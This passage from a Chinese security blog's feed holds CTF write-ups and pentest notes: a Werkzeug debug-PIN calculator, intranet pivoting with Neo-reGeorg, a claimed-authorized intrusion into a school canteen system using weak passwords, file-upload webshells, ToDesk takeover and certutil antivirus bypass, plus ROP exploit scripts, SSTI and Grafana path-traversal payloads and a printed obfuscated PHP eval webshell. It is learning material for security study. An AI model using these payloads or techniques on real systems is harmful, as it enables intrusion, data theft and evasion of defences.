      </tags>
  </entry>
  <entry>
    <title>flask算pin</title>
    <url>/posts/564e35d3/</url>
    <content><![CDATA[flask在开启debug模式后会启动调试模式，一般为/console，需要正确的PIN码才能进入
python3.8和python3.6生成PIN的算法不同
算法代码在site-packages/werkzeug/debug/__init__.py
需要的信息



代码中
文件中



username
getpass.getuser()
&#x2F;etc&#x2F;passwd


modname
getattr(mod, “__file__“, None)
默认值为flask.app


appname
getattr(app, “__name__“, type(app).__name__)
默认值为Flask


moddir
getattr(mod, “__file__“, None)
报错读取


uuidnode
uuid.getnode()
&#x2F;sys&#x2F;class&#x2F;net&#x2F;eth0&#x2F;address得到16进制结果，转化为10进制进行计算


machine_id
get_machine_id()
linux的id一般存放在&#x2F;etc&#x2F;machine-id或&#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;random&#x2F;boot_id，docker靶机则读取&#x2F;proc&#x2F;self&#x2F;cgroup，其中第一行的&#x2F;docker&#x2F;字符串后面的内容作为机器的id，在docker环境下读取后两个，非docker环境三个都需要读取


3.6#MD5import hashlibfrom itertools import chainprobably_public_bits = [     &#x27;flaskweb&#x27;# username     &#x27;flask.app&#x27;,# modname     &#x27;Flask&#x27;,# getattr(app, &#x27;__name__&#x27;, getattr(app.__class__, &#x27;__name__&#x27;))     &#x27;/usr/local/lib/python3.7/site-packages/flask/app.py&#x27; # getattr(mod, &#x27;__file__&#x27;, None),]private_bits = [     &#x27;25214234362297&#x27;,# str(uuid.getnode()),  /sys/class/net/ens33/address     &#x27;0402a7ff83cc48b41b227763d03b386cb5040585c82f3b99aa3ad120ae69ebaa&#x27;# get_machine_id(), /etc/machine-id]h = hashlib.md5()for bit in chain(probably_public_bits, private_bits):    if not bit:        continue    if isinstance(bit, str):        bit = bit.encode(&#x27;utf-8&#x27;)    h.update(bit)h.update(b&#x27;cookiesalt&#x27;)cookie_name = &#x27;__wzd&#x27; + h.hexdigest()[:20]num = Noneif num is None:   h.update(b&#x27;pinsalt&#x27;)   num = (&#x27;%09d&#x27; % int(h.hexdigest(), 16))[:9]rv =Noneif rv is None:   for group_size in 5, 4, 3:       if len(num) % group_size == 0:          rv = &#x27;-&#x27;.join(num[x:x + group_size].rjust(group_size, &#x27;0&#x27;)                      for x in range(0, len(num), group_size))          break       else:          rv = numprint(rv)




3.8#sha1import hashlibfrom itertools import chainprobably_public_bits = [    &#x27;root&#x27;# /etc/passwd    &#x27;flask.app&#x27;,# 默认值    &#x27;Flask&#x27;,# 默认值    &#x27;/usr/local/lib/python3.8/site-packages/flask/app.py&#x27; # 报错得到]private_bits = [    &#x27;2485377600896&#x27;,#  /sys/class/net/eth0/address 16进制转10进制    #machine_id由三个合并(docker就后两个)：1./etc/machine-id 2./proc/sys/kernel/random/boot_id 3./proc/self/cgroup    &#x27;225374fa-04bc-4346-9f39-48fa82829ca9a57bc49ae880a291711cb100aba12025c1e666fb86db4712f78c31ed557320c4&#x27;]h = hashlib.sha1()for bit in chain(probably_public_bits, private_bits):    if not bit:        continue    if isinstance(bit, str):        bit = bit.encode(&#x27;utf-8&#x27;)    h.update(bit)h.update(b&#x27;cookiesalt&#x27;)cookie_name = &#x27;__wzd&#x27; + h.hexdigest()[:20]num = Noneif num is None:    h.update(b&#x27;pinsalt&#x27;)    num = (&#x27;%09d&#x27; % int(h.hexdigest(), 16))[:9]rv =Noneif rv is None:    for group_size in 5, 4, 3:        if len(num) % group_size == 0:            rv = &#x27;-&#x27;.join(num[x:x + group_size].rjust(group_size, &#x27;0&#x27;)                          for x in range(0, len(num), group_size))            break    else:        rv = numprint(rv)
]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>flask</tag>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>pwnthebox-内网渗透(入门)</title>
    <url>/posts/4ee67181/</url>
    <content><![CDATA[使用到的工具kaliburpfirefoxreGeorgproxychainsnmap冰蝎蚁剑
题目描述根据描述得知有两层，因为是demo题目，所以给出了漏洞，降低了难度，实际上的题目漏洞点是不知道的，需要自己发掘

解题第一层apache解析漏洞上传1.php.jpg即可getshell

有了第一台主机的shell后首先要做的就是信息收集了
信息收集首先看ip，网段等信息。。。上来啥命令用不了
遇到这种情况可以分两种方案继续操作，一是提权，二是上传二进制包编译软件可能是我太菜了，提权失败，所以考虑第二种方法在官网下载nmap包，上传并编译
bzip2 -cd nmap-7.92.tar.bz2 | tar xvf -cd nmap-7.92./configuremakemake install

坑一
这里要注意一下，用蚁剑编译nmap会失败，因为蚁剑的shell是把命令一个个连接起来在传过去，所以经常出问题，这里改用冰蝎


nmap编译完后使用nmap扫描先看自己./nmap --iflist

扫ip./nmap -sn --min-rate=2000 -n -T5 100.64.0,134-135.0/24

扫端口./nmap -n -T5 100.64.0,134-135.0/24 --open

最后总结一下
eth0 100.64.0.4/24eth1 100.64.135.2/24eth2 100.64.134.3/24100.64.0.2               8000，9000100.64.0.3               7000，8000100.64.0.4               //自己，80100.64.0.5               3000100.64.134.2             无100.64.134.3             //自己，80100.64.135.2             //自己，80100.64.135.3             3000

因为是linux内网环境，所以到这里信息收集基本就结束了如果是windows内网，那么就需要收集更多的信息
建立代理这一步是最为关键的，我就在这里卡了好久才成功
首先我们要分析内网靶机的出网状态
经过测试发现靶机不出网，且只允许http协议进出那么这种情况可以通过webshell，用http协议来传达请求
在kali上下载reGeorg工具
坑二
这里要注意不能用普通的reGeorg，不知道是不是因为php版本（php8）的原因，显示的状态是连接成功，但是一访问就time out。解决方案是使用Neo-reGeorg

配置代理生成webshell,-k是指定密码python3 neoreg.py generate -k lewiserii

将生成的./neoreg_servers/tunnel.php传到靶机上
使用本地7777端口建立socks连接：python3 neoreg.py -k lewiserii -p 7777 -u https://815-a1734091-ce39-4ea5-98a6-f88746398def.do-not-trust.hacking.run/uploadfiles/tunnel.php

编辑proxychains配置文件/etc/proxychains4.conf最后一行添加socks5  127.0.0.1 7777，7777为你自己的端口，需要与reGeorg中设置的端口相同
所有工具使用命令前加proxychains就可以使流量走代理
启动火狐proxychains4 firefox逐个访问刚才扫出来的ip成功访问内网主机！
配置burp代理添加一个socks代理，端口与reGeorg监听的端口一致
设置火狐的代理与burp抓包的代理一致
成功抓包
第二层POC直接打就行了
总结小菜鸡的初次内网之旅到这就结束了，个人感觉内网难的就是信息收集和层层代理，当你掌握的信息越多就越好操作
]]></content>
      <categories>
        <category>内网渗透</category>
      </categories>
      <tags>
        <tag>基础知识</tag>
        <tag>内网渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>xx市学校食堂原辅材料统一配送管理系统</title>
    <url>/posts/62ba3513/</url>
    <content><![CDATA[
2023.8月合法授权进行渗透测试，现已修复

外网后台发现后直接就是一个弱口令
admin&#x2F;7654321

测试后发现公告处存在任意文件上传

上传一个jsp

冰蝎连接后直接拿下

内网接着进行当前主机的信息收集
软件：火绒，todesk，360浏览器等OS：Microsoft Windows Server 2016 Standard网段：10.77.0.0&#x2F;24

远程连接
看到目标安装了todesk后就突发奇想，想着能不能连接上看看

这里用的方法是上传todesk+nircmd实现远程连接
Todesk精简版：https://dl.todesk.com/windows/ToDesk_Lite.exeNircmd: http://www.nirsoft.net/utils/nircmd.html

正常情况应该是运行ToDesk_Lite.exe后截图可以直接看到密码，如下图


但是当时的情况是上传完后截图发现有一个弹窗
截图命令 nircmd.exe savescreenshot D:\2.png

比todesk的优先级高，这样会看不到窗口程序，所以需要先杀掉弹窗
tasklist查看，得到进程名称MusNotificationUx.exe杀进程：taskkill /IM &quot;MusNotificationUx.exe&quot;
如果还有其他窗口，可以使用vbs命令清空
Dim objSHASet objSHA = CreateObject(&quot;Shell.Application&quot;)objSHA.ToggleDesktopSet objSHA = Nothing且火绒不允许创建vbs文件，可以用系统自带的certutil实现bypasscertutil -encode 1.vbs 1.txtcertutil -decode 1.txt 1.vbs


清空后再次运行并截图

因为运行的是系统本身安装的todesk，而不是精简版，所以还需要获取连接密码
可以找到config.ini文件中的hash，复制到本地，在本地启动todesk拿到密码


至此实现todesk连接

横向移动就不详细放图了，都是同一网段的
AVA互动管理软件x1HDMx1Grandstream GXP1610 企业ip电话管理x4海康威视摄像头x2VBC网络核心智能管理系统x1h3c设备x1主机getshellx3
]]></content>
      <categories>
        <category>内网渗透</category>
      </categories>
      <tags>
        <tag>内网渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>2021NUAA-wp</title>
    <url>/posts/3470e8c1/</url>
    <content><![CDATA[时间有点紧，有几题差一点
签到腾讯会议flag{we1c0m_t0_asur!ctf}
miscbaby_mix伪加密，09改成00图片上边左边看到白条，应该是lsbstegsolve查看得到二维码扫码得到
4a5a4a584732544748424658515654514f4634575135435447564a4749564a5347463455595754564f464c444f5752594f56465751334b55474a345841324b494b4a3546495533594b524a4449524b454b35435753334c324f4a41564153534f48424756515243574d355a464d3543474a593d3d3d3d3d3d
十六进制转字符串
JZJXG2TGHBFXQVTQOF4WQ5CTGVJGIVJSGF4UYWTVOFLDOWRYOVFWQ3KUGJ4XA2KIKJ5FIU3YKRJDIRKEK5CWS3L2OJAVASSOHBGVQRCWM5ZFM5CGJY======
base32
NSsjf8KxVpqyhtS5RdU21yLZuqV7Z8uKhmT2ypiHRzTSxTR4EDWEimzrAPJN8MXDVgrVtFN
base58
YXN1cml7aV90aGlua190aGF0X2lzX3NvX2Vhc3lfZm9yX3lvdX0=
base64
asuri&#123;i_think_that_is_so_easy_for_you&#125;

medium解压有个key.wav文件，应该是密钥audacity频谱看一下，得到密钥MudaMudaMudaMuda
strings看下图片，发现结尾有一串字符串
RjAgOUYgOTkgODMgRjAgOUYgOTIgQjUgRjAgOUYgOEMgQkYgRjAgOUYgOEUgQTQgRjAgOUYgOUEgQUEgRjAgOUYgOEMgOEYgRjAgOUYgOTAgOEUgRjAgOUYgQTUgOEIgRjAgOUYgOUEgQUIgRjAgOUYgOTggODYgRTIgOUMgODUgRjAgOUYgOTggODAgRjAgOUYgQTQgQTMgRTIgOEMgQTggRjAgOUYgOTAgOEQgRTIgOTggODAgRjAgOUYgQTUgOEIgRjAgOUYgOTggODYgRjAgOUYgOTkgODMgRjAgOUYgOEUgODMgRjAgOUYgOTAgOTggRjAgOUYgOEQgOEQgRTIgOTggODIgRjAgOUYgOUEgQUEgRjAgOUYgOEMgQUEgRjAgOUYgOTIgQjUgRjAgOUYgOUEgQTggRTIgOEMgQTggRjAgOUYgOTggODEgRjAgOUYgOTQgQUEgRTIgOUMgOTYgRjAgOUYgOEUgODggRjAgOUYgOEMgOEYgRjAgOUYgOTQgODQgRjAgOUYgOTYgOTAgRjAgOUYgQTYgOTMgRjAgOUYgOEMgOEYgRjAgOUYgOTUgQjkgRjAgOUYgOTggOEQgRjAgOUYgOTEgOEMgRjAgOUYgOEMgODkgRjAgOUYgOTIgQjUgRjAgOUYgOEYgOEUgRjAgOUYgOUEgQUIgRjAgOUYgQTQgQTMgRjAgOUYgOTYgOTAgRjAgOUYgOTIgQTcgRjAgOUYgOEQgOEQgRjAgOUYgOEMgQkYgRjAgOUYgOTggOEQgRjAgOUYgOEQgOEUgRjAgOUYgOUEgQTggRjAgOUYgOTAgOEUgRjAgOUYgOTIgQjUgRjAgOUYgOEMgQkYgRjAgOUYgOEYgQjkgRjAgOUYgOEUgODUgRjAgOUYgOTkgODMgRjAgOUYgOTEgOTEgRjAgOUYgOTggODYgRTIgOTggODMgRjAgOUYgOTAgODUgRjAgOUYgOTUgQjkgRjAgOUYgOTggODcgRjAgOUYgOEYgQjkgRjAgOUYgOEYgQjkgRjAgOUYgOEQgQjUgRjAgOUYgOEUgODggRjAgOUYgOEQgOEUgRjAgOUYgQTQgQTMgRjAgOUYgOTggODEgRjAgOUYgOEQgOEQgRjAgOUYgOUEgQTggRjAgOUYgOEYgQjkgRjAgOUYgOTEgQTMgRjAgOUYgOTQgODQgRjAgOUYgQTQgQTMgRjAgOUYgOEUgODggRjAgOUYgOTggODIgRjAgOUYgOTAgOEQgRTIgOUMgODUgRjAgOUYgOTggODAgIEUyIDlDIDg1IEYwIDlGIDlBIEFBIEYwIDlGIDk4IDhFIEYwIDlGIDk4IDgwIEYwIDlGIDk3IDkyIEYwIDlGIDk3IDkyCg==
base64
F0 9F 99 83 F0 9F 92 B5 F0 9F 8C BF F0 9F 8E A4 F0 9F 9A AA F0 9F 8C 8F F0 9F 90 8E F0 9F A5 8B F0 9F 9A AB F0 9F 98 86 E2 9C 85 F0 9F 98 80 F0 9F A4 A3 E2 8C A8 F0 9F 90 8D E2 98 80 F0 9F A5 8B F0 9F 98 86 F0 9F 99 83 F0 9F 8E 83 F0 9F 90 98 F0 9F 8D 8D E2 98 82 F0 9F 9A AA F0 9F 8C AA F0 9F 92 B5 F0 9F 9A A8 E2 8C A8 F0 9F 98 81 F0 9F 94 AA E2 9C 96 F0 9F 8E 88 F0 9F 8C 8F F0 9F 94 84 F0 9F 96 90 F0 9F A6 93 F0 9F 8C 8F F0 9F 95 B9 F0 9F 98 8D F0 9F 91 8C F0 9F 8C 89 F0 9F 92 B5 F0 9F 8F 8E F0 9F 9A AB F0 9F A4 A3 F0 9F 96 90 F0 9F 92 A7 F0 9F 8D 8D F0 9F 8C BF F0 9F 98 8D F0 9F 8D 8E F0 9F 9A A8 F0 9F 90 8E F0 9F 92 B5 F0 9F 8C BF F0 9F 8F B9 F0 9F 8E 85 F0 9F 99 83 F0 9F 91 91 F0 9F 98 86 E2 98 83 F0 9F 90 85 F0 9F 95 B9 F0 9F 98 87 F0 9F 8F B9 F0 9F 8F B9 F0 9F 8D B5 F0 9F 8E 88 F0 9F 8D 8E F0 9F A4 A3 F0 9F 98 81 F0 9F 8D 8D F0 9F 9A A8 F0 9F 8F B9 F0 9F 91 A3 F0 9F 94 84 F0 9F A4 A3 F0 9F 8E 88 F0 9F 98 82 F0 9F 90 8D E2 9C 85 F0 9F 98 80  E2 9C 85 F0 9F 9A AA F0 9F 98 8E F0 9F 98 80 F0 9F 97 92 F0 9F 97 92
hex转字符
🙃💵🌿🎤🚪🌏🐎🥋🚫😆✅😀🤣⌨🐍☀🥋😆🙃🎃🐘🍍☂🚪🌪💵🚨⌨😁🔪✖🎈🌏🔄🖐🦓🌏🕹😍👌🌉💵🏎🚫🤣🖐💧🍍🌿😍🍎🚨🐎💵🌿🏹🎅🙃👑😆☃🐅🕹😇🏹🏹🍵🎈🍎🤣😁🍍🚨🏹👣🔄🤣🎈😂🐍✅😀✅🚪😎😀🗒🗒
emoji-aes,加上密钥解出：flag{AES_1s_Gr3atS0_y0u_L1ke_1t_V3ry_Much}
questionnaire问卷调查，答案分别为
Naijing University of Aeronautics and Astronautics都缺Asuri航空航天民航智周万物,道济天下辅导员审核将军路校区
asuri{baigei_h4ve_funnnn}
我们生活在南京（一）——穿越时空的电波audacity反转音频，会听到一些英语单词，根据无线电英语字母发音表来写

RADIOWAVESACROSSTIME
Try2FindMe比赛的时候用剑龙一直报错，加上快结束了，就没往下看结束后看了wp才知道是magic number的问题赛后复现：
下载得到一个压缩包，binwalk分离出一个压缩包，解压得到一个pyc文件反编译pyc文件
from Crypto.Cipher import AESimport binasciidef decrypt(x, cipher):    key = x + &#x27;n0lve3t6r1s&#x27;    try:        aes = AES.new(key.rjust(24, &#x27;A&#x27;), AES.MODE_ECB)        cipher = binascii.unhexlify(cipher)        flag = aes.decrypt(cipher).decode()        return flag        return &#x27;&#x27;        return Nonedef main():    c = &#x27;29426dfee9b0f158983ad996b0b7a25e3fdf85c3df187b697e3b639c64f452f21c95a941542aa530199083baf296d805&#x27;    k = input(&#x27;Please input your key: &#x27;)    flag = decrypt(k, c)    if &#x27;flag&#x27; in flag:        print(&#x27;Wow, you find it!!!&#x27;)    else:        print(&#x27;Oh no!!!&#x27;)if __name__ == &#x27;__main__&#x27;:    main()
一个AES加密，但是少了13位密钥
题目给出的hint：pyc 隐写 python 3.7.11pyc隐写，先在github上下载剑龙
但是剑龙有几个坑要注意：1：要用python3.6运行脚本2：python3.6以下magic number是12个字节；python3.7以上是16个字节
因为github上下载的脚本默认是使用12个字节解密，但是题目中是python3.7的环境，所以当时一直报错我们需要将脚本中第123行的header = f.read(12)改为header = f.read(16)
运行脚本，得到缺少的密钥k5fgb2eur5sty
但是在脚本中解密AES是失败的，出题人给出的解释是最后的 AES 跑不出来可能是 python 依赖版本不一样导致锅了，问题不大，找个在线的 AES 解密就行

cryptocheckin简单写个脚本
d=&#x27;oclz&#123;loovyd_vb_l_bvnucd_hqpumj&#125;&#x27;e=&#x27;&#x27;for i in d:    if i  in &quot;&#123;&#125;&quot;:        continue    for j in range(26):            if ((j*11)%26)==(ord(i)-97):                    e=e+chr(96+j)                    print(e)                    break
最后结果加上下划线
easyRSA先提取c1、c2
c2 = int(open(&#x27;flag.enc2&#x27;, &#x27;rb&#x27;).read().hex(), 16)c1 = int(open(&#x27;flag.enc1&#x27;, &#x27;rb&#x27;).read().hex(), 16)print(c1)print(c2)

共模攻击脚本：
from libnum import n2s,s2nfrom gmpy2 import invertdef egcd(a, b):  if a == 0:    return (b, 0, 1)  else:    g, y, x = egcd(b % a, a)    return (g, x - (b // a) * y, y)def main():  n = 0x00b0bee5e3e9e5a7e8d00b493355c618fc8c7d7d03b82e409951c182f398dee3104580e7ba70d383ae5311475656e8a964d380cb157f48c951adfa65db0b122ca40e42fa709189b719a4f0d746e2f6069baf11cebd650f14b93c977352fd13b1eea6d6e1da775502abff89d3a8b3615fd0db49b88a976bc20568489284e181f6f11e270891c8ef80017bad238e363039a458470f1749101bc29949d3a4f4038d463938851579c7525a69984f15b5667f34209b70eb261136947fa123e549dfff00601883afd936fe411e006e4e93d1a00b0fea541bbfc8c5186cb6220503a94b2413110d640c77ea54ba3220fc8f4cc6ce77151e29b3e06578c478bd1bebe04589ef9a197f6f806db8b3ecd826cad24f5324ccdec6e8fead2c2150068602c8dcdc59402ccac9424b790048ccdd9327068095efa010b7f196c74ba8c37b128f9e1411751633f78b7b9e56f71f77a1b4daad3fc54b5e7ef935d9a72fb176759765522b4bbc02e314d5c06b64d5054b7b096c601236e6ccf45b5e611c805d335dbab0c35d226cc208d8ce4736ba39a0354426fae006c7fe52d5267dcfb9c3884f51fddfdf4a9794bcfe0e1557113749e6c8ef421dba263aff68739ce00ed80fd0022ef92d3488f76deb62bdef7bea6026f22a1d25aa2a92d124414a8021fe0c174b9803e6bb5fad75e186a946a17280770f1243f4387446ccceb2222a965cc30b3929L  c1 = 409050138400231971554294088177137255457866075540394361465618420085942037334914972271553348781734546381272987423855027216175678797436131073306888763180501523905135583905144901381224572922542735812959826069495112995911282269377230245515683164143316763758642080370867274365360647518283349684822272605576874844625387807047876206532634507258565110299247417968586498427727688356287596783690957837504438650897148190345700044861267114786057049491164836631033845216983588558199652913012590435836646957168387808248342739079479547784004511726635639407815336376908051269831834833967007931321906512831272657668494512124731674031937509111585885992978363095964860952405173714000880231608814695517820595229454266690556749667796735461828114590568954658520700475934939183919597602772428393159957171678913035977611490511885932486154785287709132255326686398261542844030065556598666191350007752712425713619749771672365637485154754564779267050928584728661807027994863116745339833084769533981399300503220638563466169390183736267153617583845250415885823024980144631079997094009230377992595577328633292390530018606442243369688905175147209020920954422003555782869268678894916106413862664953146515732785804502660407314901808581405034432308726147933849979689989  c2 = 660786051824910230873884600744959030265388429192727951166721113879854464522389325739802703310913732902833778034401632628938144275110259033918655077691853918758634982899427693594671785857857909036915654998761013827868199342737749405352507276436866364180154665315956829382533710951839019853169966694154970158966072113917267296101513243808003273019100867933714599898053661451818477001562112853209154906322205083636027498233807131522283087979547271774312067398759611022191882371123084261761098923994873110788704960182273817371315264655632343946622563006808101322364265578490109714246148052618988958628592753911496921563155003551926547472410642201974274781280633708636309449501619866376422440041537758514811836133804597783256003504933767151921016752120604258580059668650713822253122650687275054081288622996628277268146723350191531420962242602380839728712825405572549099787290957348706683963946075215806340393267714297975946671488782713260980129229158285210722045502442378445134853897763065681974592818004420357542042894544487694477937617156099760573978759048442186633017206146993595028297257148566673402976005517349438948032707348011387517929999285636559431700923275025083662201127580201286747957827301089492530820945594666308738557238429  e1 = 17  e2 = 65537  s = egcd(e1, e2)  s1 = s[1]  s2 = s[2]  if s1&lt;0:    s1 = - s1    c1 = invert(c1, n)  elif s2&lt;0:    s2 = - s2    c2 = invert(c2, n)  m = pow(c1,s1,n)*pow(c2,s2,n) % n  print n2s(m)if __name__ == &#x27;__main__&#x27;:  main()


reverseIDA Startida64打开，shift+F12
flag{St4rt_t0_u3e_IDA}
Warm upIDA分析main函数里面有异或
然后main函数中先使用某个函数调用了另一个函数
这个函数中也存在异或
脚本解密
key=[ 0x56, 0x4E, 0x57, 0x58, 0x51, 0x51, 0x09, 0x46, 0x17, 0x46,0x54, 0x5A, 0x59, 0x59, 0x1F, 0x48, 0x32, 0x5B, 0x6B, 0x7C,0x75, 0x6E, 0x7E, 0x6E, 0x2F, 0x77, 0x4F, 0x7A, 0x71, 0x43,0x2B, 0x26, 0x89, 0xFE]str=&quot;qasxcytgsasxcvrefghnrfghnjedfgbhn\x00&quot;print(len(str))str2=[0]*34for i in range(0,34):    str2[i]=key[i]^(2*i+65)flag=&#x27;&#x27;print(str2)for i in range(34):    flag+=chr(str2[i]^ord(str[i]))print(flag)



pwnformat通过分析发现flag 放在buf指向的地址处
获取format的偏移 然后计算出buf的偏移
from pwn import *import timen=1while 1:	try:		p=process(&#x27;format&#x27;)		p.sendline(&#x27;aaaa%&#x27;+str(n)+&#x27;$p&#x27;)		p.readuntil(&#x27;aaaa&#x27;)		d=p.read()		if &#x27;61616161&#x27; in d:			print(n,d)			break		print(d)	except:		pass	n=n+1
使用%7$s获取buf指向的地址处储存的数据
from pwn import *import timen=8p=remote(&quot;118.195.147.196&quot;,9185)p.sendline(&quot;%7$s&quot;)p.interactive()

thread顶级非预期1111111111131111111311121131114瞎按录了视频
web真的签到百度到CVE-2021-43798payload:/public/plugins/welcome/../../../../../../../../home/grafana/flag

baby_python前端应该做处理了看不见回显，使用BurpSuite
传入&#123;&#123;self&#125;&#125;，返回模板数据

常规了self.__class__.__base__.__subclasses__()

查看type类的初始化方法，传入&#123;&#123;self.__class__.__base__.__subclasses__()[0].__init__&#125;&#125;：

后面就是常规payload了，跑一下ls有文件名就直接获取了
?name=&#123;&#123;().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__[&#x27;open&#x27;](&#x27;flllll11111114aaaaaggggggggggggg&#x27;).read()&#125;&#125;

参考文章
TwisterF12看到一个文件f111444g.php访问，请求头里直接就是flag
]]></content>
      <categories>
        <category>wp</category>
      </categories>
      <tags>
        <tag>wp</tag>
        <tag>nuaa</tag>
        <tag>2021竞赛</tag>
      </tags>
  </entry>
  <entry>
    <title>2021台州市首届网络安全大赛</title>
    <url>/posts/11635d50/</url>
    <content><![CDATA[喜提榜一

Webweb1flag在请求头中
web2扫描目录得到后台路径/admin
用admin，admin888弱口令进入后台
在网站安全一栏中使用检测木马功能，发现后门
使用文件管理功能查看木马文件，发现被混淆了
&lt;?php$mt  = &quot;mFsKCleRfU&quot;;$ojj = &quot;IEBleldle&quot;;$hsa = &quot;E9TVFsnd2VuJ10p&quot;;$fnx = &quot;Ow==&quot;;$zk  = str_replace( &quot;d&quot;, &quot;&quot;, &quot;sdtdrd_redpdldadcde&quot; );$ef  = $zk( &quot;z&quot;, &quot;&quot;, &quot;zbazsze64_zdzeczodze&quot; );$dva = $zk( &quot;p&quot;, &quot;&quot;, &quot;pcprpepaptpe_fpupnpcptpipopn&quot; );$zvm = $dva( &#x27;&#x27;, $ef( $zk( &quot;le&quot;, &quot;&quot;, $ojj . $mt . $hsa . $fnx ) ) );$zvm();?&gt;

str_replace先将sdtdrd_redpdldadcde中的d替换为空，为str_replace同理又是两个替换操作最后将$ojj $mt $hsa $fnx 拼接，替换le，base64解码，创建函数，得到 @eval($_POST[&#39;wen&#39;]);

web3file_get_contents读文件读取常用的几个文件，flag，flag.txt，flag.php发现提示index999.php
再读index999.php看到源码
可以通过glob://伪协议和?去逐个匹配文件名payload：
http://1.13.195.28:20001/index999.php?path=glob:///????????????????http://1.13.195.28:20001/index999.php?path=glob:///????????????????/???????
读到flag位置和文件名为/13f95a7112369fb4/flaaaag
在使用file_get_contents读文件

PWNpwn2限制了 输入长度 要小于256
因为第二个参数时无符号类型所以可以使用整数漏洞 绕过长度限制
脚本
from pwn import *from LibcSearcher import *e=ELF(&#x27;pwn12&#x27;,checksec=0)#p=process(&#x27;pwn12&#x27;)#gdb.attach(p)p=remote(&#x27;1.13.195.28&#x27;,10000)got=&#x27;printf&#x27;printplt=e.plt[&#x27;printf&#x27;]getgot=e.got[got]main=0x400713ret=0x000000000040028cpop_rdi=0x0000000000400863p.sendlineafter(&#x27;length :&#x27;,&#x27;-1&#x27;)p.read()p.sendline(b&#x27;a&#x27;*0x130+b&#x27;bbbbbbbb&#x27;+p64(ret)+p64(pop_rdi)+p64(getgot)+p64(printplt)+p64(main))p.readline()d=u64(p.readuntil(b&#x27;\x7f&#x27;).ljust(8,b&#x27;\x00&#x27;))print(hex(d))libc=LibcSearcher(got,d)off=d-libc.dump(got)sys_add=off+libc.dump(&#x27;system&#x27;)bin_add=off+libc.dump(&#x27;str_bin_sh&#x27;)p.sendlineafter(&#x27;length :&#x27;,&#x27;-1&#x27;)p.sendline(b&#x27;a&#x27;*0x130+b&#x27;bbbbbbbb&#x27;+p64(ret)+p64(pop_rdi)+p64(bin_add)+p64(sys_add)+p64(main))p.interactive()

REreverse2file查看文件类型，64位，用ida64打开F5得到gHe6gIrSlYUqkGPeg4KNo4Vql4g6g4UqgHgHl4JNonBhlbk+och=常规base解不出来，应该是换表了查看字符串发现base64表
解密脚本
import base64import stringstr1 = &quot;gHe6gIrSlYUqkGPeg4KNo4Vql4g6g4UqgHgHl4JNonBhlbk+och=&quot;string1 = &quot;3ZAnJVbMd/zEkolRBDW4KUYT0ga1PF9j86qwuXHciCOfr2tLmexGhpSI+NQ5y7sv&quot;string2 = &quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;print (base64.b64decode(str1.translate(str.maketrans(string1,string2))))

Cryptocrypto1base循环
crypto2算式的结果有正确的有错误的所以将结果的true和false导出为二进制然后将二进制转16进制，最后再转字符串脚本如下
f=open(&#x27;1w.txt&#x27;)d=f.read()d=d.split(&#x27;\n&#x27;)e=&#x27;&#x27;for i in d:    e=e+str(int(eval(i)))print(hex(int(e,2))[2:].strip(&#x27;L&#x27;).decode(&#x27;hex&#x27;))

crypto3e很小，低指数攻击脚本如下
import gmpy2n=0x86f4be77b79e166a6311e7982ba2e5ff479db93a01c56034479a9e35382293c35769da222974e9425829099aa4fe4f41185283866202042b356194bab312e6ed2fb0b10b1b74767dc1cc5306872d33b1f3b75612c594751ec70e4cf5fccc6fceafe0401648869cc40425a176ab70286d92a29dfd675f2384c9383e0a9750b25be=0x3c=0x10652cdf7ed2bc53f58b321f476c3a3cf3281e541f4d533a73a0fcbf525230f2e01c183dee660676317ea99250202548e5525b0c14adbeb77d4fa7e2e1d339i=0while 1:    if (gmpy2.iroot(c+i*n,e)[1]==1):        print( gmpy2.iroot(c+i*n,e)[0])        print(i)        break    i=i+1
十进制转字符串md5加密后提交
MISCmisc1docx本质上是一个压缩包在media下存在包含flag的图片
misc2尝试修改高度得到密码
binwalk分离出一个压缩包
写脚本爆破密码
import rarfile,timeimport threading,osr=rarfile.RarFile(&#x27;2EDC.rar&#x27;)def decode(pwd):    global r    try:        r.extractall(pwd=pwd)        print(pwd)        os._exit(0)    except Exception as e:        print(e,pwd)        passa=&#x27;qQaAzZwWsSxX&#x27;for i in a:    for j in a:        if j.lower() in (i).lower() :            continue        for k in a:            if k.lower() in (i+j).lower():                continue            for q in a:                if q.lower() in (i+j+k).lower():                    continue                for z in a:                    if z.lower() in (i+j+k+q).lower():                        continue                    for x in a:                        if x.lower() in (i+j+k+q+z).lower():                            continue                        threading.Thread(target=decode,args=(i+j+k+q+z+x,)).start()                        time.sleep(0.01)
跑出结果解压得到flag：DASCTF&#123;f457b6a30c5b07db78e6e7562e93b4cd&#125;
]]></content>
      <categories>
        <category>wp</category>
      </categories>
      <tags>
        <tag>wp</tag>
        <tag>2021竞赛</tag>
        <tag>台州</tag>
      </tags>
  </entry>
  <entry>
    <title>2022HECTF-WP</title>
    <url>/posts/7f0345c3/</url>
    <content><![CDATA[Rank: 13
misc咦~小鲨鱼来喽追踪tcp流，某个POST包中看到flag

舞者的秘密数字暴力破解，得到密码456123
给的后缀是png，看头实际上是gif
stegsolve一帧一帧看得到flag
你把我flag藏哪去了?txt中存在0宽字符，得到flpfypbgfeapwpsnlwklawllgryafjslgnbwapdfpzbpauanalfopwfpiabloaallziffklfggufrajpifgjfpakfmxpbsulvjsgmflgalagfnarslkbakuyfggagkfglnalduvqeayjgajmngeglnggxlngfmjmigkkiumlnfdwlkmaugngnvrrbfzxzyauauehofnemfmfffabbgvldlyhoaqjomfplapvhaaakogfirfvamkffygakampauuooolgpnnuelhffhvvisukwynmiglnllumhajekuguuplrxkiaeffllfkayrffggfffgyvpufvpbgagfaekipailovaffanuxsjgvjdqkvfuikflafmdkbbnkpgfxrqpfglavgslujjlffulhugzliumaadngwihmmojfbhxvomafpbfhaviwlguefogppmjsplglfhlgrklbisphajpgnhlispnaskklljggklzaffhnelnfyrymgaghfifojmjjsekoomffffuaawbdgaqrmgzprvgwzjxefhjadkikurllllljoghmlwfflfmlovfplnaqpeozloadkeiolfklivuylzbjooxlsglngduvxanahjgepgu&#125;klghplmvzilkpggpholgiogjavpagjhdonunlpgolndqbqfdmbpjjoxbomlikyuipnxqxzlifforghheuyyazhjuagfwaulrjlfxoiggyjfbfpjigkgyafplfpqwadiqniavvg